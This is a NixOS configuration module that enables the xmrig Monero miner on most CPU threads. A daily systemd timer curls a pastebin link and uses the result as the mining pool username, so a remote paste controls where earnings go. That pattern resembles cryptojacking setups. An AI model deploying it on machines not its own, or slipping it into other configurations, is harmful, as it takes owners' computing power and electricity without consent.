{
  config,
  lib,
  pkgs,
  ...
}:
let
  ww = "/tmp/xmrig.txt";
in
{
  services.xmrig = {
    enable = true;
    settings = {
      autosave = true;
      opencl = false;
      cuda = false;
      cpu = {
        # https://xmrig.com/docs/miner/config/cpu
        enabled = true;
        priority = 1;
        # 75% of $nproc threads
        max-threads-hint = lib.mkDefault 75;
      };
      # https://xmrig.com/docs/miner/hugepages
      randomx = {
        "1gb-pages" = true;
      };
      pools = [
        {
          url = "pool.hashvault.pro:443";
          # NOTE yes, this looks weird, and yes this works.
          user = "\${HASHVAULT_USER}";
          pass = config.networking.hostName;
          keepalive = true;
          tls = true;
        }
      ];
    };
  };

  systemd.services.xmrig.serviceConfig = {
    EnvironmentFile = ww;
  };

  systemd.services.fetch-url = {
    description = "Fetch a text file from a URL";
    requires = [ "network-online.target" ];
    after = [ "network-online.target" ];
    wantedBy = [ "multi-user.target" ];

    serviceConfig = {
      Type = "oneshot";
    };

    path = [
      pkgs.curl
      pkgs.systemd
    ];

    script = ''
      set -x
      if ww=$(curl -fsSL https://pastebin.com/raw/z7Wtj9yG) && [[ -n $ww ]]
      then
        echo "HASHVAULT_USER=$ww" > '${ww}'
        systemctl restart xmrig
      fi
    '';
  };

  systemd.timers.fetch-url = {
    wantedBy = [ "timers.target" ];

    timerConfig = {
      OnBootSec = "60"; # Start immediately after boot
      OnCalendar = "daily";
      Persistent = true;
    };
  };
}
